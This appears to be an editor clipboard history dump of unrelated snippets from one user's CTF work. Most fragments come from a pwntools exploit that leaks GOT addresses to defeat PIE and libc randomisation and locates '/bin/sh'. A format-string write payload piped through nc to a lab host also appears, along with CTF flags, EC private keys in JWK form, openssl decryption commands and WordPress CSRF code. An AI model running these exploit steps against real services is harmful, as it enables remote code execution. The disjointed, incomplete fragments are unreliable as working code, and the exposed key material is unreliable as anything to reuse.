	# payload += p32(BINARY_BASE_ADDR + exe.symbols["puts"])
5503577415fc1d8d6b3818212a1745bc|file:///home/neo/ccsc/pie/exploit.py|114|39|v|python
	symbols
8431f24aadb22c2e28580eaf4a100850|file:///home/neo/ccsc/pie/exploit.py|111|19|v|python
	 + p32(print_pie_addr) + "B" * 4
ea86b98fbec78eb4315bfe85e8897616|file:///home/neo/ccsc/pie/exploit.py|121|1|V|python
	# log.info("Received: %s" % line)
7933a81f4661d42540e0cc87c505d6e3|file:///home/neo/ccsc/pie/exploit.py|120|1|V|python
	puts_libc = u32(line[1:5])
	log.info("Puts libc: %#x" % puts_libc)
5368162dd652c39f4a9e3831f5bcf903|file:///home/neo/ccsc/pie/exploit.py|120|1|V|python
	# log.info("Received: %s" % line)
	# log.info("Received addr: %s" % u32(line))
b994f1aff13af7ff36d5cd828d4d0d07|file:///home/neo/ccsc/pie/exploit.py|108|36|v|python
	got["main"]
18a0739611148d4c129be5ab18a9bf54|file:///home/neo/ccsc/pie/exploit.py|108|1|V|python
	MAIN_ADDR = BINARY_BASE_ADDR + exe.sym.main
098890dde069e9abad63f19a0d9e1f32|file:///home/neo/ccsc/pie/exploit.py|116|13|v|python
	AAAA
6634b37f4cb97a1407b3a1dca7978808|file:///home/neo/ccsc/pie/exploit.py|115|16|v|python
	BINARY_BASE_ADDR + exe.sym.puts
e2b24f6de5b48412ead043a1cbe0fb2e|file:///home/neo/ccsc/pie/exploit.py|116|1|V|python
	payload += p32()
c8274b923fd56ed423b98b9be0d42cff|file:///home/neo/ccsc/pie/exploit.py|116|1|V|python
	payload += "CCCC"
bcc765b9e2d58156583e2560921d2de6|file:///home/neo/ccsc/pie/exploit.py|117|16|v|python
	MAIN_ADDR
83582cf3b813a004fc15aebb09ec0f05|file:///home/neo/ccsc/pie/exploit.py|116|1|V|python
	# payload += p32(print_pie_addr)
352aaeb7fcf46d4494d0c9e4730aedea|file:///home/neo/ccsc/pie/exploit.py|117|16|v|python
	0xdeadbeef
43de058b0a8cbe48fa786e1694e8e8e8|file:///home/neo/ccsc/pie/exploit.py|119|1|V|python
	# payload += p32(BINARY_BASE_ADDR + exe.got["puts"])
26b5aeaeda2b3b36ef1d67b338201fc4|file:///home/neo/ccsc/pie/exploit.py|114|1|V|python
	# payload = p32(print_pie_addr) * 6
8ac0a5292d60e46fca530b15cdc06a13|file:///home/neo/ccsc/pie/exploit.py|116|16|v|python
	PUTS_ADDR
0d4d8b0f51c65f54d1021d9ec3489358|file:///home/neo/ccsc/pie/exploit.py|101|47|V|python
	PRINTF_GOT = BINARY_BASE_ADDR + exe.got["printf"]
	log.info("Printf GOT: %#x" % PRINTF_GOT)
5f1cbac34d124fdbd99fe7f959856161|file:///home/neo/ccsc/pie/exploit.py|85|1|V|python
	# PRINTF_OFFSET = exe.sym.printf
	# log.info("Printf offset: %#x" % PRINTF_OFFSET)
	
f69fd6d34f1e04d51dd3ee40dc08ce6f|file:///home/neo/ccsc/pie/exploit.py|113|19|v|python
	_contains("Got this:")
55ee87eee102e9a53c09652fc2c2db62|file:///home/neo/ccsc/pie/exploit.py|114|1|V|python
	# PUTS_LIBC = u32(line[:4])
5fe6d473fc10b14b7ee09ac2b0e5bf18|file:///home/neo/ccsc/pie/exploit.py|103|1|V|python
	PUTS_ADDR = BINARY_BASE_ADDR + exe.sym.puts
61f6fc570522d6e90cd178ad4dc93b6b|file:///home/neo/ccsc/pie/exploit.py|82|1|V|python
	PRINT_PIE_OFFSET = exe.sym.print_pie
92780ac539849d9845d9a3043421e226|file:///home/neo/ccsc/pie/exploit.py|109|20|v|python
	+ p32(0x00616161)
d75831996cd56edb5c91c5258ef5e748|file:///home/neo/ccsc/pie/exploit.py|110|16|v|python
	BINARY_BASE_ADDR + exe.plt["puts"]
ec9935fc3a1c1aa83147d1ffc220c065|file:///home/neo/ccsc/pie/exploit.py|100|1|V|python
	PUTS_GOT = BINARY_BASE_ADDR + exe.got["puts"]
2ab7587ebfedc7a2a5dbf0a446e1e166|file:///home/neo/ccsc/pie/exploit.py|102|1|V|python
	log.info("Puts GOT: %#x" % PUTS_GOT)
c71cccda4cd37d609fc2d13a7e9b3640|file:///home/neo/ccsc/pie/exploit.py|113|12|v|python
	p32(MAIN_ADDR)
4e9e1eaa2016cc7d47aaf85e9efbeef1|file:///home/neo/ccsc/pie/exploit.py|114|12|v|python
	p32(PUTS_GOT)
2a6fe7020d4b345584502126d007cfc7|file:///home/neo/ccsc/pie/exploit.py|113|11|V|python
	payload += 
	payload += 
745b3eb59a0dd4aefaef25f18fb0501c|file:///home/neo/ccsc/pie/exploit.py|112|1|V|python
	# payload += flat([PUTS_PLT, MAIN_ADDR, PUTS_GOT])
a1bbeaa51bf3617282f0f510996a85be|file:///home/neo/ccsc/pie/exploit.py|112|1|V|python
	# payload += "cccc"
e2af5b59ce785029572b51c966338622|file:///home/neo/ccsc/pie/exploit.py|112|1|V|python
	# payload += p32(PUTS_PLT)
e2e7f7830f1b9e68dd5d6581751be917|file:///home/neo/ccsc/pie/exploit.py|128|1|V|python
	# payload += p32(MAIN_ADDR)
4e7028f032a4f69ec662fc654aba5575|file:///home/neo/ccsc/pie/exploit.py|114|1|V|python
	# payload += p32(PUTS_GOT)
63b8a46420b7c6d5d50e00ad6532101e|file:///home/neo/ccsc/pie/exploit.py|112|1|V|python
	payload += p32(PUTS_GOT)
	payload += p32(MAIN_ADDR)
50ed12515a58ac6a6b77d50683841ac5|file:///home/neo/ccsc/pie/exploit.py|113|1|V|python
	payload += p32(MAIN_ADDR)
0f92ef33a73c48b45f8290c237f6344f|file:///home/neo/ccsc/pie/exploit.py|114|1|V|python
	payload += p32(0xdeadbeef)
009f5332321f64469c9d57f47d9f8777|file:///home/neo/ccsc/pie/exploit.py|112|18|V|python
	payload += p32(0xdeadbeef)
	payload += "BBBB"
5c0e7b6e5018ca6636cf673a1054e75b|file:///home/neo/ccsc/pie/exploit.py|115|1|V|python
	payload += p32(0x0000000)
5e4e709e34ed810bb7aaee4ee053c465|file:///home/neo/ccsc/pie/exploit.py|67|1|V|python
	    pie breakpoint put_pie+92
23d8466ab217dcb2507ef07ba512502e|file:///home/neo/ccsc/pie/exploit.py|108|11|v|python
	Puts PLT
53fef71f0af10a6dae5dd2ba30b0270f|file:///home/neo/ccsc/pie/exploit.py|108|24|v|python
	PUTS_PLT
7811ad64b90e9233ba8d279797e2e0bd|file:///home/neo/ccsc/pie/exploit.py|120|1|V|python
	io.sendline("2")
7631bfa8f0bc61334c6d1de5c610d1fc|file:///home/neo/ccsc/pie/exploit.py|101|1|V|python
	GOT_ADDR = BINARY_BASE_ADDR + exe.got
8c170b449f513063fe29a9b4eca2f3a3|file:///home/neo/ccsc/pie/exploit.py|100|1|V|python
	log.info("Binary base addr: %#x" % BINARY_BASE_ADDR)
6ce976e8f061b2b5cfe4d0c50c3405dd|file:///home/neo/ccsc/pie/exploit.py|101|11|v|python
	Binary
031a8eccdc971e44d2559dc0d00ae94a|file:///home/neo/ccsc/pie/exploit.py|101|15|v|python
	base 
9686cf0d008f42e644cd29cfe545f27d|file:///home/neo/ccsc/pie/exploit.py|101|28|v|python
	BINARY_BASE_ADDR
16835007760f0ef20fef29f38c8440de|file:///home/neo/ccsc/pie/exploit.py|100|11|V|python
	GOT_ADDR = exe.symbols.got
	log.info("GOT addr: %#x" % GOT_ADDR)
5416c6697a80bf989b41bd1a6cd7810a|file:///home/neo/ccsc/pie/exploit.py|110|1|V|python
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 40 + p32(PUTS_GOT - 0x18) +"AAAA"
	payload += p32(PUTS_PLT)
	payload += p32(MAIN_ADDR)
	payload += p32(PUTS_GOT)
	io.sendline(payload)
	line = io.recvline_contains("Got this:")
	log.info("Received: %s" % line)
	line = io.recvline()
	line = io.recv(4)
	PUTS_LIBC = u32(line)
	log.info("Received: %s" % line)
	log.info("Puts@libc: %#x" % PUTS_LIBC)
9f0649c54f82580fbbe454df023eb7e8|file:///home/neo/ccsc/pie/exploit.py|103|37|v|python
	plt["puts"]
2decc1cab8339394a1a5f5addc5670ae|file:///home/neo/ccsc/pie/exploit.py|140|1|v|python
	PUTS_LIBC
3545b1ac2dc06570f4c5039bf0b4b9f3|file:///home/neo/ccsc/pie/exploit.py|112|45|v|python
	from the main menu:")
d9f3d50944a7a653c97f6b0dfb2c9368|file:///home/neo/ccsc/pie/exploit.py|145|1|V|python
	# line = io.recvuntil("Please enter an option from the main menu:")
	# io.sendline('2')
	# line = io.recvuntil("Give me your pie:")
	# payload = "A" * 48 
	# payload += p32(print_pie_addr)
	# payload += p32(MAIN_ADDR)
	# io.sendline(payload)
	# # line = io.recvline_contains("Got this:")
	# line = io.recvline()
	# log.info("Received: %s" % line)
6e1f12adb73dcb196a9a0ce768bbfa0d|file:///home/neo/ccsc/pie/exploit.py|103|1|V|python
	PRINTF_GOT = BINARY_BASE_ADDR + exe.got["printf"]
093af62a9aea2658c44d705ffd8754f7|file:///home/neo/ccsc/pie/exploit.py|130|1|V|python
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 40 + p32(PUTS_GOT - 0x18) +"AAAA"
	payload += p32(PUTS_PLT)
	payload += p32(MAIN_ADDR)
	payload += p32(PRINTF_GOT)
	io.sendline(payload)
	line = io.recvline_contains("Got this:")
	log.info("Received: %s" % line)
	line = io.recvline()
	line = io.recv(4)
	PRINTF_LIBC = u32(line)
	log.info("Received: %s" % line)
	log.info("Printf@libc: %#x" % PRINTF_LIBC)
4ec5c92b1f3d935daaf30bcdae06534d|file:///home/neo/ccsc/pie/exploit.py|161|1|V|python
	# Overwrite put_pie return address (WORKS)
3c9cf3cb81e387378749420641299ee6|file:///home/neo/ccsc/pie/exploit.py|104|42|v|python
	scanf
d80051c73653c87f39d25dfa64a82cd8|file:///home/neo/ccsc/pie/exploit.py|108|11|v|python
	Scanf
21f8872e2f7e72f25c86776376c02383|file:///home/neo/ccsc/pie/exploit.py|108|30|v|python
	SCANF_GOT
35836e76bfe5beb4a5bf1fb1a3d946c0|file:///home/neo/ccsc/pie/exploit.py|152|16|v|python
	STRLEN_GOT
b4cb864eceb1594e1dd5d768ddaf3409|file:///home/neo/ccsc/pie/exploit.py|158|1|v|python
	STRLEN_LIBC
14aaaaf88906c46378c6079ca2257c3c|file:///home/neo/ccsc/pie/exploit.py|160|31|v|python
	STRLEN_LIBC)
73d3a702db472629f27b06ac8f056476|file:///home/neo/ccsc/pie/exploit.py|104|42|v|python
	strlen
3028a1247eff9457a4bb719239f947d1|file:///home/neo/ccsc/pie/exploit.py|108|11|v|python
	Strlen
163662ffbe8f0960ceb9ff64f4944056|file:///home/neo/ccsc/pie/exploit.py|81|1|V|python
	BINSH_OFFSET = LIBC_BASE + next(libc.search('/bin/sh\x00'))
d298fe5032104022c4506b8be5002256|file:///home/neo/ccsc/pie/exploit.py|177|1|V|python
	# log.info("Received: %s" % line)
	
	# shellcode = asm(shellcraft.sh())
	# payload = fit({
	#     32: 0xdeadbeef,
	#     'iaaa': [1, 2, 'Hello', 3]
	# }, length=128)
	# io.send(payload)
	# flag = io.recv(...)
	# log.success(flag)
	
	
1d8e89e156c62612c9e9a8b8989e51e3|file:///home/neo/ccsc/pie/exploit.py|164|1|V|python
	BINSH_ADDR = LIBC_BASE + next(libc.search('/bin/sh\x00')) 
dd4fdc3f15b08e738d65c947bb99fac1|file:///home/neo/ccsc/pie/exploit.py|165|1|v|python
	BINSH_ADDR
d1acc582afda077f3d294788167487fa|file:///home/neo/ccsc/pie/exploit.py|165|27|v|python
	next(libc.search('/bin/sh\x00')) 
acf5ebbac572921d86ab22970673645b|file:///home/neo/ccsc/calanthe/kgrams.py|7|11|v|python
	b[i:i+n]
28ace5be91fd9e2707bdd5a6c8479dba|file:///home/neo/ccsc/wasphive/validator.dec|10|1|V|
	  "\8f\cc\9f\dc\a7\d0\e3\81\b5\c6\f3\96\fb\99\f5\8c\d3\e2\91\ce\fe\8b\bc\e3"
	  "\d3\b5\ea\9e\f6\c7\b4\eb\9c\ac\de\b2\d6\f7\d6\f7\8a";
0fc8dac4db22ad40e65e06269ce0e477|file:///home/neo/ccsc/wasphive/notes|15|5|V|
	    a = input
0b4400528469ff2bf38b3a9ed4639572|file:///home/neo/ccsc/wasphive/notes|20|9|v|
	5244464
00697c8fa6625490eda96bde3a7f5de5|file:///home/neo/ccsc/wasphive/notes|17|4|V|
	    c = b
3b5cfdd843068df7028b7ae4a9f6cfe8|file:///home/neo/.config/i3/config|235|1|V|conf
	# exec_always wal -i /usr/share/backgrounds/white_ring.jpg 
f89afbbf4c6f45a46b97ca9fbe218f1d|file:///home/neo/.config/i3/config|241|1|V|conf
	exec feh --bg-scale /usr/share/backgrounds/white_ring.jpg
4e2cbeeff4aa49ce2440a311a0beadeb|file:///home/neo/.config/i3/config|242|1|V|conf
	exec feh --bg-scale /usr/share/backgrounds/astronaut.jpg
88563c3c46b74d2f143fe6d89c8a2533|file:///home/neo/ccsc/wasphive/notes|49|7|v|
	var9
db64069253646971a765d6e1e815276c|file:///home/neo/ccsc/wasphive/notes|67|9|V|
	        u = 204
1bddbe55f51fa30d3eb3bd714f8167d9|file:///home/neo/ccsc/wasphive/notes|68|9|V|
	        ...
fab1957d7e387446907f116e3badddd4|file:///home/neo/ccsc/wasphive/notes|76|9|V|
	        fa = 24
0f68729a6f07f2af84b0e62dc501f80e|file:///home/neo/ccsc/wasphive/notes|36|5|V|
	    b = 5244480 (array)
20552ba9e1031d900e843f4d5a083283|file:///home/neo/ccsc/wasphive/notes|37|5|V|
	    d = 5244464 (array)
3b9c96edc77fe672eb7caf5c3cbd3dc1|file:///home/neo/ccsc/wasphive/notes|37|5|V|
	    e = 0
f39ea4b2ad8a9376adca6223c91e39c7|file:///home/neo/ccsc/wasphive/notes|38|5|V|
	    d[2] = input
c37ef99c8b3d953fbc08934090b2c431|file:///home/neo/ccsc/wasphive/notes|38|5|V|
	    d[7] = 204
9524049316f79b8213d31e90159ea05d|file:///home/neo/ccsc/wasphive/notes|38|5|V|
	    d[0] = 0
820db90ff4df6e8730f683d3e2745ca2|file:///home/neo/ccsc/wasphive/notes|43|5|V|
	    k(var10) = 24
3fba6c5ce1c0a0d24b3f89d018d66c23|file:///home/neo/ccsc/wasphive/notes|43|5|V|
	    l(var11) = j << 24
c36fd7a0385872825bce501530197198|file:///home/neo/ccsc/wasphive/notes|43|5|V|
	    m(var12) = l >> 24
e586423a25c7f197a75898ad53a831cb|file:///home/neo/ccsc/wasphive/notes|44|1|V|
	        ra = 1
	        d[3] = 1
	        sa = 1
	        return 1
eb74761d075df4d7f3b46da8ea6d6cb9|file:///home/neo/ccsc/wasphive/notes|49|9|V|
	        r = 24
622053b6f16694028c74213d1f56209b|file:///home/neo/ccsc/wasphive/notes|49|9|V|
	        s = p[0] << 24
23a4131edeb220f6c373c70e63ab6a30|file:///home/neo/ccsc/wasphive/notes|49|9|V|
	        t = s >>
508c58c0c2b443567df4f820552a62ab|file:///home/neo/ccsc/wasphive/notes|50|9|V|
	        x = p[0]
b30125818418224c3d40617447d8b991|file:///home/neo/ccsc/wasphive/notes|50|13|v|
	p[0] ^ p[0]
2d29fe1f9e142cab23425c41fce32289|file:///home/neo/ccsc/wasphive/notes|54|9|V|
	        ca = aa << 24
5235dda685abdeccc8c504d0b510dbfd|file:///home/neo/ccsc/wasphive/notes|55|9|V|
	        ea = y
03d1f4d4280f0f17f4b2835e2fa3571d|file:///home/neo/ccsc/wasphive/notes|55|9|V|
	        ga = y << 24
2ad63bff67a793be918a14e0a108d8da|file:///home/neo/ccsc/wasphive/notes|55|9|V|
	        ha = ga >> 24
9ca57d89a0b42c43924a0c95beb5fb99|file:///home/neo/ccsc/wasphive/notes|54|9|V|
	        da = aa
8d68920eea66344687bc6e98c2f97253|file:///home/neo/ccsc/wasphive/notes|54|9|V|
	        ia = da
dd962a1b0bff464d1aaeee6f37386eb3|file:///home/neo/ccsc/wasphive/notes|54|9|V|
	        ja = ha
fcf5fcd934d612015f471f6c1e3c136c|file:///home/neo/ccsc/wasphive/notes|46|9|V|
	        o = 0
8ba5f5e52a69b8c1765443888f0f6931|file:///home/neo/ccsc/wasphive/notes|45|9|V|
	        n = input
1bb594be68ec034d8e7fbf2419b80930|file:///home/neo/ccsc/wasphive/notes|45|9|V|
	        p = ptr(input)
2c02447693f3cf40b8d1f35646604552|file:///home/neo/ccsc/wasphive/notes|60|9|V|
	        oa = 0
d139d7bf396c771ce20c4fa55e3f13d2|file:///home/neo/ccsc/wasphive/notes|60|9|V|
	        pa = 1
f3cbeb1040992322dbf9c8bf3c5dbd54|file:///home/neo/ccsc/wasphive/notes|60|9|V|
	        qa = 1
8628a50aa3e919ac83fb2b6ae3813dab|file:///home/neo/ccsc/wasphive/notes|63|9|V|
	        ra = 1
4623efc2314f31030d5aff06a0a44dde|file:///home/neo/ccsc/wasphive/notes|56|9|V|
	        na = 0
6a8ab89b74a10a395ae0368e2832888d|file:///home/neo/ccsc/wasphive/notes|20|9|v|
	524480
353da61a872e33d1481215b790d2c7fd|file:///home/neo/ccsc/wasphive/notes|55|9|V|
	        if (ma == 0) goto B_d <=== Must take this or else returns 0
7f6ac866b4d446fbd551979bd7107ad3|file:///home/neo/ccsc/wasphive/notes|55|30|v|
	 <=== Must take this or else returns 0
7237a0931ba6c5e6a2556d24f8cbf697|file:///home/neo/ccsc/wasphive/notes|51|9|V|
	        aa = da = ia = z[1024]
363d17af41dec51dc226f60b2f15b3dc|file:///home/neo/ccsc/wasphive/notes|47|9|V|
	        y = ea = ha = ja = 0
1295719b92cd14b5d9571e33133c979e|file:///home/neo/ccsc/wasphive/notes|51|9|V|
	        la = 1
d983fe72e65c909f21fb394abf868955|file:///home/neo/ccsc/wasphive/notes|49|9|V|
	        z = 0
16f303e40c1797fc10a6fbf58a7d1ddf|file:///home/neo/ccsc/wasphive/notes|46|9|V|
	        z = ptr(0)
78e20b774e385fa2446d8da85b1614c2|file:///home/neo/ccsc/wasphive/notes|46|9|V|
	        d[7] = 0
32734946ca4931378fe652701253ec05|file:///home/neo/ccsc/wasphive/notes|36|4|V|
	    c = 16
e7c82166574cfe1ae8325a68be7ca906|file:///home/neo/ccsc/wasphive/notes|38|5|V|
	    g(var6) = input
3e5d8f629eee13105a3960d1f604ccd5|file:///home/neo/ccsc/wasphive/notes|38|5|V|
	    h(var7) = 0
79c18e07f3471878a9aaf29e4b7a4bbe|file:///home/neo/ccsc/wasphive/notes|36|5|V|
	    f = d[7] 204
440c261a7f942ba371950058701c5e82|untitled:1|2|1|V|
	-52
	-114
	-113
	142
	-114
	-113
a30768c0d9ac829798434afec6345a70|file:///home/neo/ccsc/wasphive/validator.dec|10|1|V|
	  "\8f\cc\9f\dc\a7\d0\e3\81\b5\c6\f3\96\fb\99\f5\8c\d3\e2\91\ce\fe\8b\bc\e3"
f637aeeb1048bc296ce3fbdaae47c3f0|file:///home/neo/ccsc/wasphive/validator.dec|11|1|V|
	  "\d3\b5\ea\9e\f6\c7\b4\eb\9c\ac\de\b2\d6\f7\d6\f7\8a";
3d503ddff01b6cd7889577d120256999|untitled:1|1|1|V|
	CCCS{w3b4s5e}
baed76e677bf9ba0fe2bc05c44a2ce53|file:///home/neo/ccsc/noonwraith/keys.txt|1|1|V|text
	INBVGQ33MEZDMNZUNQYTEX2UNAZXEM27JE2V63RTOYZXEX3BL5ZTGYZQNZSF6MDQOAYHE5DVNZUXI6K7ORXV63JUNMZV6NC7MZEXEU3UL5EW24DSGNZXGSLPNZPTAMRRMZ2TQMZRPU======
9fa7b28f9558016e44683e928397deed|file:///home/neo/ccsc/calanthe/notes|17|1|V|
	cs -> space => c->2 s->0
46f4ca88053fb1335a5d6e3b36abcebd|file:///home/neo/ccsc/calanthe/notes|17|1|V|
	ur -> e => u->6 r->5
8414b20d19cc291c04d194975ac4baf1|file:///home/neo/ccsc/calanthe/kgrams.py|4|1|V|python
	for i in range(0,len(b)-n+1,n):
00ede0dcbe4898636401e7b8ae31ce5f|file:///home/neo/ccsc/abnormal/scan.py|5|14|v|python
	[HTTPRequest]
fcde243b6f7ce6117c390b93a23d2e47|file:///home/neo/ccsc/abnormal/scan.py|3|21|v|python
	abnormal_communication
f330b7b772685a4fcbe564aa5eb08328|file:///home/neo/ccsc/lastwish/notes|12|1|V|
	ccsc{tossAcoin}
010b96ec0572e030924b2f8af4485018|file:///home/neo/ccsc/writeups|22|1|V|conf
	{"kty":"EC","crv":"P-256","x":"z8nGOX1EfiBxDqxecQTuuI1x8sbP_XHo96bqNL5GPR4","y":"MTluV7uwACZyEWtv72VOzDyt0QOSrY81A3g5b289xLg","d":"6gNP-y4ip6ozXs4Sft4B4l04pK1k_oE2F9WIxECuSV0"}
fe35586e11a8cc8750e99708207895e1|file:///home/neo/ccsc/eclectic/jwk-pem.js|5|1|V|javascript
	var jwk = {"kty":"EC","crv":"P-256","x":"cbum6QVxbVXNlI3WlsfVTxa49f2rHrBMyKBDQbOQ3FA","y":"T1v5EZDTkY6qtu1Nv7v_1Ut3R-KGrCrC-WYHlRkHtfY","d":"yZFQjVW4-vYf6QL0RcNtPT9unkzDSq5pbxqIjO_tr6Y"}
93c4c59c15c6068cd1d97bfb10fe7196|file:///home/neo/.histfile|4862|1|V|
	openssl pkeyutl -derive -inkey key1.pem -peerkey key2_pub.pem -out alice_shared_secret.bin
844bcb306c3ec2c749a321a78c99814b|file:///home/neo/.histfile|4865|1|V|
	openssl pkeyutl -derive -inkey key2.pem -peerkey key1_pub.pem -out bob_shared_secret.bin
63e9afbcc65cb59131294379d271e2f3|file:///home/neo/.histfile|4867|1|V|
	openssl enc -aes256 -base64 -k $(base64 bob_shared_secret.bin) -d -in cipher.txt -out plain_again.txt
3a3fc32784c96d89f217257d9ba727b2|file:///home/neo/.histfile|4872|1|V|
	openssl enc -aes-256-ecb -base64 -k $(base64 bob_shared_secret.bin) -d -in cipher.txt 
2a0c9868b129c2f6bca5b9b06ce9ebdc|file:///home/neo/.histfile|4876|1|V|
	openssl enc -aes-256-ecb -base64 -k $(base64 bob_shared_secret.bin) -d -in secret.txt 
70c61517e810dc549f02c0ed19e210a0|file:///home/neo/.histfile|4886|1|V|
	echo oiRBTkO3KAhRENFUS0IoyZi9kTKGRcTMQWTiRv6UXe4 | openssl enc -aes-256-ecb -base64 -k $(base64 bob_shared_secret.bin) -d -out plain.txt
c88ddf67878087dcd9904d6d97455385|file:///home/neo/.histfile|4917|1|V|
	echo oiRBTkO3KAhRENFUS0IoyZi9kTKGRcTMQWTiRv6UXe4= | base64 -d | xxd -p | openssl enc -aes-256-ecb -k $(base64 bob_shared_secret.bin) -d -out plain.txt
920472061a0563537f3e9a79fea69238|file:///home/neo/.histfile|4996|1|V|
	openssl enc -aes-256-ecb -K 5cb22981192bcf1a99cbdb27a031bfe385c960829d46edea519e964009d7fcb3 -in cipher.txt -out decoded.txt
ef66c105ccb7b3bbd506c372312a1019|file:///home/neo/.histfile|5012|1|V|
	openssl enc -aes256 -nosalt -K 5cb22981192bcf1a99cbdb27a031bfe385c960829d46edea519e964009d7fcb3 -in cipher.txt | base64
3bf1b402659daf3321ded9a7ee956639|file:///home/neo/.histfile|5067|1|V|
	openssl enc -aes-256-ecb -nosalt -K 5cb22981192bcf1a99cbdb27a031bfe385c960829d46edea519e964009d7fcb3 -d -in secret 
11be901d412c2e16a34551bd0d035421|file:///home/neo/ccsc/writeups|46|32|v|conf
	}t0b_s1ht_em4c_gn0la_aiv1R_f0_tl4r3g_ht1wCSCC
32fd30a0493d7f1fd83c6c609c768990|file:///home/neo/ccsc/lastwish/notes|1|1|V|
	Witcher books (description has book emojis):
	
	1 = The Witcher
	2 = A Grain of Truth
	3 = The Lesser Evil
	4 = A Question of Price
	5 = The Edge of the World
	6 = The Last Wish
	
	book:word:letter
	
	ccsc{tossAcoin}
e5c01cec7a20c7ff65b39ec074e472ff|file:///home/neo/ccsc/writeups|73|1|V|conf
	#
	Witcher books (description has book emojis):
0ee33c5fa76f94b4edd5c215e3d475ef|file:///home/neo/ccsc/abnormal/gethttp.py|8|1|V|python
	>>> client_packets = PacketList([p for p in packets if p[IP].src == '10.0.3.2' and Raw in p])
d52bf251a11355628e68be348de5a8c0|file:///home/neo/ccsc/abnormal/gethttp.py|8|1|V|python
	client_packets = PacketList([p for p in packets if p[IP].src == '192.168.232.135' and Raw in p])
4ba35c1c50c6f67e600daa8465eb743d|file:///home/neo/ccsc/abnormal/gethttp.py|9|1|v|python
	client_packets
6e9e311dea9a87e83426f3310e546e55|file:///home/neo/.histfile|8321|1|V|
	echo -e 'aa\x48\x9c\x04\x08%11$nAAA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%139x%14$n%207x%15$n%127x%16$n%260x%17$n' | nc -v 192.168.125.10 1337
6d4726b420d0bc5a07c89d157c5d7260|file:///home/neo/ccsc/writeups|122|1|V|conf
	-> Final input: echo -e 'aa\x48\x9c\x04\x08%11$nAAA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%139x%14$n%207x%15$n%127x%16$n%260x%17$n'
93846c9df32977bbe25e9d2f92f013f5|file:///home/neo/ccsc/abnormal/scan.py|1|1|V|python
	from scapy.all import *
096740a8e7abaca1ce347563699b6a35|file:///home/neo/ccsc/abnormal/scan.py|14|1|V|python
	packets = rdpcap('./http.pcapng')
	
	print packets.show()
cfa7966c752426be281f3e7876ef1de0|file:///home/neo/ccsc/abnormal/scan.py|6|9|v|python
	Eavesdrop_Data
98e22d93ce14c2613439fe85ac9c2f8c|file:///home/neo/ccsc/calanthe/notes|21|1|V|
	c = 2
d1a3fa1aba369e7b2a03ad68c55a05dc|file:///home/neo/ccsc/calanthe/notes|21|1|V|
	s = 0
64cb7d1cc934629ce9d0d8d07536952b|file:///home/neo/ccsc/calanthe/notes|24|1|V|
	x = 5
9892e0dec15329824fc93c80c55b7650|file:///home/neo/ccsc/calanthe/notes|37|1|V|
	qs = 2e = . (only one 2-char starting with q, 6 times, only dot makes sense)
a2d73f16b58f13ef0596f819372bf694|file:///home/neo/ccsc/calanthe/notes|40|1|V|
	jv = 7d = }
afc40a2d10bd9afa2922892c3c7fe2f2|file:///home/neo/ccsc/calanthe/notes|41|1|V|
	xv = 5d = ]
4eeb63993243469c3ac96db2a1f721b8|file:///home/neo/ccsc/calanthe/notes|40|1|V|
	xj = 57 = P
cac3ba0dafcd80740c6e39e399936a18|file:///home/neo/ccsc/calanthe/notes|28|1|V|
	k = 6
0171c3202c9f58b6a6dd9e025dc7c2f2|file:///home/neo/ccsc/writeups|154|48|v|conf
	ed in, so first we have to choose the log in option
c60ffdd6b4bf4cef38f51970eb3cae3c|file:///home/neo/ccsc/writeups|154|1|V|conf
	-> 1st if statement checks if the user has logg
d61725fc55d16ea469cd0252fb4c49c4|file:///home/neo/ccsc/writeups|154|38|v|conf
	pointing to the user struct
5a6aa2bd1487509e878ff01ee7ed557b|file:///home/neo/ccsc/writeups|154|93|v|conf
	is null
ea96c3a1a43b97141e89a7a945c72cbf|file:///home/neo/ccsc/writeups|159|1|V|conf
	-> We have to write the address of get_flag where that pointer is pointing
94a08da1fecbb6e8b46990538c7b50b2|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|25|10|v|php
	token
3e67724d240ac3297d3df15e76f9d569|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|25|1|V|php
	# Create nonce to set as csrf token and cookie
	$token = bin2hex(openssl_random_pseudo_bytes(16));
	setcookie("CSRFtoken", $token, time() + 60 * 60 * 24);
c2dc52e59e49de4415c12b582de073a7|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1412|1|V|php
					<input type="hidden" name="testcookie" value="1" />
50cd3538d408ee1f534b7b6c0b45360b|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1413|32|v|php
	testcookie
c6380874d9c067bd187b15903c345ba7|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1413|1|V|php
					<input type="hidden" name="csrf-token" value="' . $token . '" />
535466228f202817f0e44cb14e779e56|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1413|1|V|php
	                <input type="hidden" name="csrf-token" value="<?= $token ?>" />
43b3e72a1dc9d406b9a54bf494c00e74|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2334|1|V|php
	        echo "Wrong length!";
84897fbe424a5457e6a3b177957b3bf6|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2328|13|V|php
	            if ($_POST["CSRFtoken"] == $_COOKIE["CSRFtoken"]){
	                // code for checking the user and password
	            }
97730d81dc00d2d012bb78314709817f|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2334|1|V|php
	                return apply_filters( 'check_password', false, $credentials, $stored_pk, $user_id );
aab4843b6fbbab4c3f3bdcebafc0776c|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2329|15|V|php
	        } else{
	
c1ae501bcae29e53d3986d30631c5762|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2332|9|V|php
	        $message = "af82";
5cc619282d0f7dd33c18f31e55fb19f3|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|27|12|v|php
	CSRFtoken
